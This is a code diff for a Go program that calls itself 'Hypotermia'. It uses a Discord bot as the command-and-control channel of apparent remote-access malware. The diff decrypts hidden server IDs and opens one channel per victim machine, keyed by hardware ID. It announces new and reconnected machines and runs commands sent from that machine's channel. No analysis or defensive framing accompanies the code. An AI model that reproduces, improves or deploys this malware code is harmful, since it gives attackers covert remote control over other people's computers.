@@ -22,6 +22,7 @@ type Command interface {
 }
 
 var commandsList = make(map[string]Command)
+var channelId string
 
 func Init() {
 	register()
@@ -68,9 +69,15 @@ func Init() {
 	}
 
 	categoryId := utils_crypto_crypt.DecryptBasic(config.CategoryId)
-	channelId := getChannel(dg, categoryId, getHWID())
-	if channelId != "" {
-		dg.ChannelMessageSend(channelId, "reply to this message to run commands")
+	hwid := getHWID()
+
+	channel, code := getChannel(dg, categoryId, hwid)
+	channelId = channel
+
+	if code == 1 {
+		dg.ChannelMessageSend(channel, "Hypotermia successfully connected to new machine.")
+	} else if code == 2 {
+		dg.ChannelMessageSend(channel, fmt.Sprintf("Hypotermia successfully reconnected to: %s", hwid))
 	}
 
 	select {}
@@ -78,6 +85,10 @@ func Init() {
 
 func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if m.Author.ID == s.State.User.ID {
+		return
+	}
+
+	if m.ChannelID != channelId {
 		return
 	}
 
@@ -91,8 +102,6 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 
 	cmdName := args[0]
-	cmd, exists := commandsList[cmdName]
-
 	if cmdName == "help" {
 		var helpStr string = "commands:\n"
 
@@ -106,6 +115,7 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		return
 	}
 
+	cmd, exists := commandsList[cmdName]
 	if exists {
 		cmd.Run(s, m, args[1:])
 	} else {
@@ -137,33 +147,33 @@ func validateEncrypted(data string) error {
 	return nil
 }
 
-func getChannel(s *discordgo.Session, categoryID, name string) string {
+func getChannel(s *discordgo.Session, categoryId string, name string) (id string, code int) {
 	serverId := utils_crypto_crypt.DecryptBasic(config.ServerId)
-	guild, err := s.Guild(serverId)
+	channels, err := s.GuildChannels(serverId)
 	if err != nil {
-		return ""
+		return "", 0
 	}
 
 	name = strings.ToLower(strings.TrimSpace(name))
-	for _, channel := range guild.Channels {
+	for _, channel := range channels {
 		channelName := strings.ToLower(strings.TrimSpace(channel.Name))
 
-		if channel.Type == discordgo.ChannelTypeGuildText && channelName == name && channel.ParentID == categoryID {
-			return channel.ID
+		if channelName == name && channel.Type == discordgo.ChannelTypeGuildText && channel.ParentID == categoryId {
+			return channel.ID, 2
 		}
 	}
 
 	channel, err := s.GuildChannelCreateComplex(serverId, discordgo.GuildChannelCreateData{
 		Name:     name,
 		Type:     discordgo.ChannelTypeGuildText,
-		ParentID: categoryID,
+		ParentID: categoryId,
 	})
 
 	if err != nil {
-		return ""
+		return "", 0
 	}
 
-	return channel.ID
+	return channel.ID, 1
 }
 
 func getHWID() string {
